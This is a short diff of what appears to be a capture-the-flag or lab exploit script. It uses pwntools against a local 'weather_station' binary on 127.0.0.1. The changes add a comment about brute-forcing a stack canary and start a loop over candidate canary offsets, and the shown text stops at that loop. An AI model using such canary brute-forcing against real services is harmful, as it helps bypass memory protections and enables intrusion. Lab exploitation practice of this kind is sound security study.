@@ -1,10 +1,12 @@
 from pwn import *
 import time
 
+
 HOST, PORT = '127.0.0.1', 5555
-#OFFSET_TO_CANARY = ???
-#OFFSET_TO_RIP = ???
 elf = ELF('./weather_station', checksec=False)
+
+#lab code for brute forcing the canary, modified for canary offset
+
 #known = b"\x00"
 #for i in range(7):
 for canaryOff in range(48,256):
